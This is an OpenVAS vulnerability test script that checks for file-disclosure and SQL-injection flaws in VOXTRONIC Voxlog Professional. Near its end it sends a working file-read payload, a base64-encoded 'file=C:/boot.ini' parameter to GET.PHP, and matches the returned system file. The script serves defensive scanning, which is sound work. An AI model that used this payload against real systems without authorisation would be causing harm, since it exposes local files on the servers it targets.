###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_voxtronic_voxlog_52081.nasl 10028 2018-05-30 13:13:04Z cfischer $
#
# VOXTRONIC Voxlog Professional Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103430");
 script_bugtraq_id(52081);
 script_version ("$Revision: 10028 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("VOXTRONIC Voxlog Professional Multiple Security Vulnerabilities");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/52081");
 script_xref(name : "URL" , value : "http://www.voxtronic.com/");

 script_tag(name:"last_modification", value:"$Date: 2018-05-30 15:13:04 +0200 (Wed, 30 May 2018) $");
 script_tag(name:"creation_date", value:"2012-02-20 14:56:07 +0100 (Mon, 20 Feb 2012)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 script_tag(name : "summary" , value : "VOXTRONIC Voxlog Professional is prone to a file-disclosure
vulnerability and multiple SQL-injection vulnerabilities because it
fails to properly sanitize user-supplied input.");

 script_tag(name : "impact" , value : "An remote attacker can exploit these issues to obtain potentially
sensitive information from local files on computers running the
vulnerable application, or modify the logic of SQL queries. A
successful exploit may allow the attacker to compromise the
software, retrieve information, or modify data. This may aid in
further attacks.");

 script_tag(name : "affected" , value : "VOXTRONIC Voxlog Professional 3.7.2.729 and 3.7.0.633 are vulnerable.
Other versions may also be affected.");

 script_tag(name:"solution_type", value:"NoneAvailable");

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

foreach dir (make_list("/voxlog","/voxalert")) {

  url = string(dir, "/oben.php");

  if(http_vuln_check(port:port, url:url,pattern:"<title>(voxLog|voxAlert)", usecache:TRUE)) {

    url = dir + "/GET.PHP?v=ZmlsZT1DOi9ib290LmluaQ=="; # file=C:/boot.ini

    if(http_vuln_check(port:port, url:url,pattern:"\[boot loader\]")) {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(0);
